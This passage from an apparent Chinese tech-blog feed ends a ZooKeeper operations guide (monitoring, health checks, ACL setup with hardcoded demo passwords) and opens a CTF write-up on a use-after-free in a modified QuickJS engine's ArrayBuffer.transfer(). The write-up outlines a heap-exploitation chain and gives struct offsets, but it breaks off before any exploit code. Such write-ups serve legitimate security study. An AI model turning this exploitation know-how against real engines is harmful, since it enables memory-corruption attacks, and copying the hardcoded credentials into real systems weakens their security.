<span class="hljs-built_in">echo</span> cons | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 监控指标 ==="</span>
<span class="hljs-built_in">echo</span> mntr | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 环境信息 ==="</span>
<span class="hljs-built_in">echo</span> envi | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>
</code></pre>
<h4 data-id="heading-45">5.2.3 健康检查脚本</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HealthChecker</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHealthy</span><span class="hljs-params">(String connectString)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(connectString, <span class="hljs-number">5000</span>, <span class="hljs-literal">null</span>)) {
            <span class="hljs-comment">// 等待连接建立</span>
            Thread.sleep(<span class="hljs-number">1000</span>);
            
            <span class="hljs-comment">// 检查是否可以读取根节点</span>
            zk.getData(<span class="hljs-string">"/"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
            
            <span class="hljs-comment">// 检查会话状态</span>
            ZooKeeper.<span class="hljs-type">States</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> zk.getState();
            <span class="hljs-keyword">return</span> state == ZooKeeper.States.CONNECTED;
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-keyword">public</span> ClusterHealth <span class="hljs-title function_">checkClusterHealth</span><span class="hljs-params">(List&lt;String&gt; servers)</span> {
        <span class="hljs-type">ClusterHealth</span> <span class="hljs-variable">health</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClusterHealth</span>();
        
        <span class="hljs-keyword">for</span> (String server : servers) {
            <span class="hljs-type">ServerHealth</span> <span class="hljs-variable">serverHealth</span> <span class="hljs-operator">=</span> checkServerHealth(server);
            health.addServerHealth(server, serverHealth);
        }
        
        <span class="hljs-keyword">return</span> health;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClusterHealth</span> {
        <span class="hljs-keyword">private</span> Map&lt;String, ServerHealth&gt; serverHealths = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">healthyCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addServerHealth</span><span class="hljs-params">(String server, ServerHealth health)</span> {
            serverHealths.put(server, health);
            <span class="hljs-keyword">if</span> (health.isHealthy()) {
                healthyCount++;
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isClusterHealthy</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> healthyCount &gt; serverHealths.size() / <span class="hljs-number">2</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-46">5.3 安全最佳实践</h3>
<h4 data-id="heading-47">5.3.1 网络安全配置</h4>
<pre><code class="hljs language-properties" lang="properties"># 启用认证
authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider
enforce.auth.enabled=true
enforce.auth.schemes=sasl

# IP白名单
# 在服务器启动脚本中设置
# -Dzookeeper.allow.unsafe.forceSync=no
# -Dzookeeper.net.allowUnsecureClientConnection=false
</code></pre>
<h4 data-id="heading-48">5.3.2 ACL 安全配置</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupSecureACL</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-number">3000</span>, <span class="hljs-literal">null</span>);
        
        <span class="hljs-comment">// 添加管理员认证</span>
        zk.addAuthInfo(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"admin:admin123"</span>.getBytes());
        
        <span class="hljs-comment">// 创建安全节点</span>
        List&lt;ACL&gt; acls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-comment">// 管理员有所有权限</span>
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.ALL, 
                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"admin:admin123"</span>)));
        
        <span class="hljs-comment">// 应用用户有读写权限</span>
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ | ZooDefs.Perms.WRITE,
                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"appuser:app123"</span>)));
        
        <span class="hljs-comment">// 只读用户只有读权限</span>
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ,
                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"readuser:read123"</span>)));
        
        zk.create(<span class="hljs-string">"/secure/config"</span>, 
                 <span class="hljs-string">"sensitive_data"</span>.getBytes(),
                 acls,
                 CreateMode.PERSISTENT);
    }
}
</code></pre>
<h2 data-id="heading-49">6. 常见问题与解决方案</h2>
<h3 data-id="heading-50">6.1 脑裂问题防护</h3>
<p>ZooKeeper 通过以下机制有效防止脑裂问题：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "正常集群: 5台服务器"
        A[Server1 Leader] --&gt; B[Server2 Follower]
        A --&gt; C[Server3 Follower]
        A --&gt; D[Server4 Follower]
        A --&gt; E[Server5 Follower]
    end
    
    subgraph "网络分区场景"
        F[Server1 Leader] --&gt; G[Server2 Follower]
        F --&gt; H[Server3 Follower]
        
        I[Server4 Follower] --&gt; J[Server5 Follower]
    end
    
    subgraph "选举结果"
        K[分区1: 3台服务器] --&gt; L[可以选举新Leader]
        M[分区2: 2台服务器] --&gt; N[无法选举Leader]
    end
</code></pre>
<p><strong>防护机制</strong>：</p>
<ol>
<li><strong>过半机制</strong>：只有获得多数派（n/2 + 1）支持的服务器才能成为Leader</li>
<li><strong>Zxid 序列</strong>：确保事务的全局顺序一致性</li>
<li><strong>会话机制</strong>：客户端与服务器维持心跳，检测连接状态</li>
</ol>
<h3 data-id="heading-51">6.2 数据一致性保证</h3>
<p>ZooKeeper 提供不同级别的一致性保证：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsistencyGuarantees</span> {
    <span class="hljs-comment">/**
     * ZooKeeper 一致性级别：
     * 
     * 1. 顺序一致性 (Sequential Consistency)
     *    - 所有更新按全局顺序执行
     *    - 客户端看到一致的更新顺序
     *    
     * 2. 原子性 (Atomicity)
     *    - 更新要么全部成功，要么全部失败
     *    - 不会出现部分更新的状态
     *    
     * 3. 单一系统映像 (Single System Image)
     *    - 客户端无论连接到哪个服务器，看到的数据视图一致
     *    
     * 4. 可靠性 (Reliability)
     *    - 一旦更新完成，数据持久化存储
     *    - 客户端会收到更新结果
     *    
     * 5. 及时性 (Timeliness)
     *    - 客户端在一定时间范围内会看到最新的数据
     */</span>
    
    <span class="hljs-comment">// 写操作一致性</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeConsistency</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 写操作是线性化的，所有客户端看到相同的顺序</span>
        <span class="hljs-comment">// 通过Leader和ZAB协议保证</span>
    }
    
    <span class="hljs-comment">// 读操作一致性  </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readConsistency</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 读操作可能看到稍旧的数据（默认）</span>
        <span class="hljs-comment">// 但可以通过sync()操作保证读最新数据</span>
    }
}
</code></pre>
<h3 data-id="heading-52">6.3 容灾与恢复策略</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Start[集群故障] --&gt; Detect[故障检测]
    Detect --&gt; Election[Leader选举]
    Election --&gt; Sync[数据同步]
    Sync --&gt; Recovery[故障恢复]
    Recovery --&gt; Normal[恢复正常]
    
    Detect --&gt; |数据损坏| Snapshot[使用快照恢复]
    Snapshot --&gt; LogReplay[重放事务日志]
    LogReplay --&gt; Validation[数据验证]
    Validation --&gt; Normal
    
    Detect --&gt; |网络分区| Quorum[检查法定人数]
    Quorum --&gt; |多数派存活| Continue[继续服务]
    Quorum --&gt; |少数派存活| Wait[等待恢复]
    
    Continue --&gt; Normal
    Wait --&gt; Reconnect[网络恢复]
    Reconnect --&gt; Sync
</code></pre>
<p><strong>恢复策略</strong>：</p>
<ol>
<li><strong>自动故障转移</strong>：Leader故障时自动选举新Leader</li>
<li><strong>数据恢复</strong>：从事务日志和快照恢复数据</li>
<li><strong>客户端重连</strong>：客户端自动重连到可用服务器</li>
<li><strong>数据校验</strong>：恢复后验证数据一致性</li>
</ol>
<h3 data-id="heading-53">6.4 性能瓶颈与优化</h3>
<p><strong>常见性能瓶颈</strong>：</p>
<ol>
<li><strong>磁盘IO</strong>：事务日志写入性能</li>
<li><strong>网络延迟</strong>：服务器间通信延迟</li>
<li><strong>内存限制</strong>：大量Watcher和节点数据</li>
<li><strong>CPU竞争</strong>：大量客户端连接和请求</li>
</ol>
<p><strong>优化方案</strong>：</p>
<pre><code class="hljs language-properties" lang="properties"># 性能优化配置
# 1. 磁盘优化
dataLogDir=/ssd/zookeeper/logs    # 事务日志使用SSD
preAllocSize=131072               # 增大预分配大小

# 2. 网络优化
tickTime=2000
initLimit=10
syncLimit=5

# 3. 内存优化
# JVM堆大小根据节点数量调整
# 避免存储大文件在Znode中

# 4. 客户端优化
# 使用连接池，避免频繁创建连接
# 合理设置会话超时时间
</code></pre>
<h2 data-id="heading-54">7. 总结</h2>
<p>ZooKeeper 作为分布式系统的基石，通过其精妙的设计和可靠的实现，为构建高可用、强一致的分布式应用提供了坚实基础。</p>
<h3 data-id="heading-55">7.1 核心价值总结</h3>
<ol>
<li><strong>可靠的协调服务</strong>：提供分布式系统所需的基本协调原语</li>
<li><strong>强一致性保证</strong>：通过ZAB协议确保数据一致性</li>
<li><strong>高可用架构</strong>：自动故障检测和恢复，保证服务连续性</li>
<li><strong>简化开发</strong>：封装复杂的分布式协调逻辑，降低开发复杂度</li>
</ol>
<h3 data-id="heading-56">7.2 适用场景</h3>
<ul>
<li><strong>配置管理</strong>：集中式配置管理，动态配置更新</li>
<li><strong>服务发现</strong>：微服务架构中的服务注册与发现</li>
<li><strong>分布式锁</strong>：跨进程资源访问协调</li>
<li><strong>领导者选举</strong>：分布式系统中的主节点选举</li>
<li><strong>集群管理</strong>：节点状态监控和故障检测</li>
<li><strong>分布式队列</strong>：简单的任务队列和协调</li>
</ul>
<h3 data-id="heading-57">7.3 最佳实践建议</h3>
<ol>
<li><strong>合理设计数据模型</strong>：避免深层次节点结构，控制节点数据大小</li>
<li><strong>优化Watcher使用</strong>：避免过多Watcher，注意重新注册</li>
<li><strong>合理规划集群规模</strong>：根据容错需求和性能要求选择服务器数量</li>
<li><strong>实施安全策略</strong>：使用ACL控制访问权限，网络隔离</li>
<li><strong>建立监控体系</strong>：全面监控集群状态和性能指标</li>
</ol>
<p>通过深入理解 ZooKeeper 的原理和机制，结合实际业务需求合理设计和优化，可以构建出稳定可靠的分布式系统，满足企业级应用的高标准要求。</p>
<hr/>
<p><strong>参考资源</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzookeeper.apache.org%2F" target="_blank" title="https://zookeeper.apache.org/" ref="nofollow noopener noreferrer">ZooKeeper 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsnailclimb.gitee.io%2Fjavaguide%2F%23%2Fdocs%2Fsystem-design%2Fdistributed-system%2Fzookeeper%2Fzookeeper-in-action" target="_blank" title="https://snailclimb.gitee.io/javaguide/#/docs/system-design/distributed-system/zookeeper/zookeeper-in-action" ref="nofollow noopener noreferrer">ZooKeeper 实战指南</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fzookeeper" target="_blank" title="https://github.com/apache/zookeeper" ref="nofollow noopener noreferrer">ZooKeeper 源码解析</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一道JS引擎题目复现babyjs]]></title>    <link>https://juejin.cn/post/7575104251865858058</link>    <guid>https://juejin.cn/post/7575104251865858058</guid>    <pubDate>2025-11-22T15:59:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251865858058" data-draft-id="7575047994682605619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一道JS引擎题目复现babyjs"/> <meta itemprop="keywords" content="安全"/> <meta itemprop="datePublished" content="2025-11-22T15:59:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BenSmith"/> <meta itemprop="url" content="https://juejin.cn/user/3145055758457438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一道JS引擎题目复现babyjs
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3145055758457438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BenSmith
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T15:59:03.000Z" title="Sat Nov 22 2025 15:59:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读33分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一道JS引擎题目复现babyjs</h2>
<h3 data-id="heading-1">前言</h3>
<p>最近在做CTF题目时遇到了一道有趣的JavaScript引擎pwn题——基于修改版QuickJS的<code>ArrayBuffer.transfer()</code>实现缺陷。这个漏洞的成因非常经典：在对象状态转换时只更新了部分相关数据结构，导致产生Use-After-Free。整个利用链从地址泄露到tcache投毒再到控制流劫持，是一次完整的堆利用实践。</p>
<p>题目的neta很有意思："经验表明，一个足够坚定的人使用poc撰写exp基本总能成功"，改编自"经验表明，一个足够坚定的人使用近战武器攻击坦克基本总能成功"。确实，有了PoC之后，剩下的就是堆布局的调试和利用链的构造了。</p>
<h3 data-id="heading-2">漏洞信息</h3>
<p><strong>题目名称</strong>: babyjs
<strong>漏洞类型</strong>: Use-After-Free (UAF)
<strong>影响版本</strong>: 修改版QuickJS（基于某个官方版本）
<strong>影响函数</strong>: <code>js_array_buffer_transfer</code> (地址 0xa6450)
<strong>漏洞成因</strong>: transfer()操作后只更新了ArrayBuffer对象的detached标志，但没有同步更新相关的TypedArray视图</p>
<h3 data-id="heading-3">相关背景知识</h3>
<h4 data-id="heading-4">JavaScript中的ArrayBuffer与TypedArray</h4>
<p>在深入漏洞分析之前，我们需要理解JavaScript中ArrayBuffer和TypedArray的工作机制。</p>
<p><strong>ArrayBuffer</strong>是JavaScript提供的一种表示固定长度原始二进制数据缓冲区的对象。它本身不能直接读写，需要通过视图（View）来操作：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建一个256字节的ArrayBuffer</span>
<span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">256</span>);

<span class="hljs-comment">// 创建不同类型的视图来访问同一块内存</span>
<span class="hljs-keyword">const</span> uint32View = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buffer);  <span class="hljs-comment">// 以32位无符号整数方式访问</span>
<span class="hljs-keyword">const</span> uint8View = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer);    <span class="hljs-comment">// 以8位无符号整数方式访问</span>
<span class="hljs-keyword">const</span> float64View = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(buffer); <span class="hljs-comment">// 以64位浮点数方式访问</span>

<span class="hljs-comment">// 这些视图都指向同一块底层内存</span>
uint32View[<span class="hljs-number">0</span>] = <span class="hljs-number">0x12345678</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(uint8View[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 0x78 (小端序)</span>
</code></pre>
<p><strong>TypedArray</strong>是一组用于访问ArrayBuffer的类型化数组视图，包括<code>Int8Array</code>, <code>Uint32Array</code>, <code>Float64Array</code>等。每个TypedArray实例都维护着指向底层ArrayBuffer的引用以及自己的偏移量和长度。</p>
<h4 data-id="heading-5">ArrayBuffer的Detached状态</h4>
<p>当ArrayBuffer被"分离"（detached）后，它的底层数据缓冲区会被释放或转移，此时：</p>
<ul>
<li>ArrayBuffer的<code>byteLength</code>属性变为0</li>
<li>任何尝试通过TypedArray访问该ArrayBuffer的操作都应该抛出TypeError异常</li>
<li>相关的TypedArray视图也应该失效</li>
</ul>
<p>常见导致ArrayBuffer detached的操作：</p>
<ol>
<li><code>ArrayBuffer.transfer()</code> - 将数据转移到新的ArrayBuffer</li>
<li><code>postMessage()</code> - 通过结构化克隆转移所有权</li>
<li>手动调用引擎内部的detach API</li>
</ol>
<h4 data-id="heading-6">ArrayBuffer.transfer()方法</h4>
<p><code>ArrayBuffer.prototype.transfer()</code>是一个相对较新的API（ES2024提案），用于创建一个新的ArrayBuffer并将原ArrayBuffer的内容转移过去：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> buffer1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>);
<span class="hljs-keyword">const</span> view1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer1);
view1[<span class="hljs-number">0</span>] = <span class="hljs-number">42</span>;

<span class="hljs-comment">// 转移数据到新buffer，可以指定新的大小</span>
<span class="hljs-keyword">const</span> buffer2 = buffer1.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">16</span>);
<span class="hljs-keyword">const</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer2);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(view2[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 42 - 数据被保留</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(buffer1.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 0 - 原buffer已detached</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(view1.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 0 - 原view也应该失效</span>

<span class="hljs-comment">// 尝试访问原view应该抛出异常</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(view1[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 应该抛出TypeError</span>
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Expected error:"</span>, e.<span class="hljs-property">message</span>);
}
</code></pre>
<h4 data-id="heading-7">QuickJS中的关键数据结构</h4>
<p>QuickJS引擎中，ArrayBuffer和TypedArray的实现涉及以下关键结构：</p>
<h5 data-id="heading-8">JSArrayBuffer结构体</h5>
<pre><code class="hljs language-c" lang="c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">JSArrayBuffer</span> {</span>
    <span class="hljs-type">int</span> byte_length;      <span class="hljs-comment">// offset +0:  缓冲区字节长度，detached时为0</span>
    <span class="hljs-type">int</span> max_byte_length;  <span class="hljs-comment">// offset +4:  可调整大小缓冲区的最大长度</span>
    <span class="hljs-type">uint8_t</span> detached;     <span class="hljs-comment">// offset +8:  detached标志，1表示已分离</span>
    <span class="hljs-type">uint8_t</span> shared;       <span class="hljs-comment">// offset +9:  shared标志，1表示SharedArrayBuffer</span>
    <span class="hljs-type">uint8_t</span> *data;        <span class="hljs-comment">// offset +16: 指向实际数据的指针，detached时为NULL</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">array_list</span>;</span>  <span class="hljs-comment">// offset +24: 关联的TypedArray视图链表</span>
    <span class="hljs-type">void</span> *opaque;         <span class="hljs-comment">// offset +40: 不透明指针，传递给free_func</span>
    JSFreeArrayBufferDataFunc *free_func;  <span class="hljs-comment">// offset +48: 释放数据的函数指针</span>
} JSArrayBuffer;
</code></pre>
<p>这个结构体的设计很清晰：</p>
<ul>
<li><code>byte_length</code>和<code>data</code>存储实际的缓冲区信息</li>
<li><code>detached</code>标志表示当前状态</li>
<li><strong><code>array_list</code>是一个双向链表头，连接所有基于此ArrayBuffer创建的TypedArray视图</strong></li>
<li><code>free_func</code>是一个函数指针，用于释放<code>data</code>指向的内存</li>
</ul>
<h5 data-id="heading-9">JSTypedArray结构体</h5>
<pre><code class="hljs language-c" lang="c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">JSTypedArray</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">link</span>;</span>   <span class="hljs-comment">// offset +0:  链接到arraybuffer的array_list</span>
    JSObject *obj;           <span class="hljs-comment">// offset +16: 指向TypedArray对象本身的指针</span>
    JSObject *buffer;        <span class="hljs-comment">// offset +24: 指向基础ArrayBuffer对象的指针</span>
    <span class="hljs-type">uint32_t</span> offset;         <span class="hljs-comment">// offset +32: 在ArrayBuffer中的字节偏移</span>
    <span class="hljs-type">uint32_t</span> length;         <span class="hljs-comment">// offset +36: TypedArray的长度（元素个数）</span>
} JSTypedArray;
</code></pre>
<p>TypedArray结构通过<code>link</code>字段串联在ArrayBuffer的<code>array_list</code>链表上。这样设计的目的是：<strong>当ArrayBuffer状态变化时（如resize或detach），可以遍历所有相关的TypedArray视图并同步更新它们的状态</strong>。</p>
<h5 data-id="heading-10">内存布局示意</h5>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ArrayBuffer对象内存布局:</span>
<span class="hljs-section">+0x00: byte_length (4 bytes)</span>
<span class="hljs-section">+0x04: max_byte_length (4 bytes)</span>
<span class="hljs-section">+0x08: detached (1 byte)</span>
<span class="hljs-section">+0x09: shared (1 byte)</span>
<span class="hljs-section">+0x10: data指针 (8 bytes)</span>
<span class="hljs-section">+0x18: array_list.next (8 bytes)  ← 链表头</span>
<span class="hljs-section">+0x20: array_list.prev (8 bytes)</span>
<span class="hljs-section">+0x28: opaque (8 bytes)</span>
<span class="hljs-section">+0x30: free_func (8 bytes)</span>

<span class="hljs-section">TypedArray对象内存布局:</span>
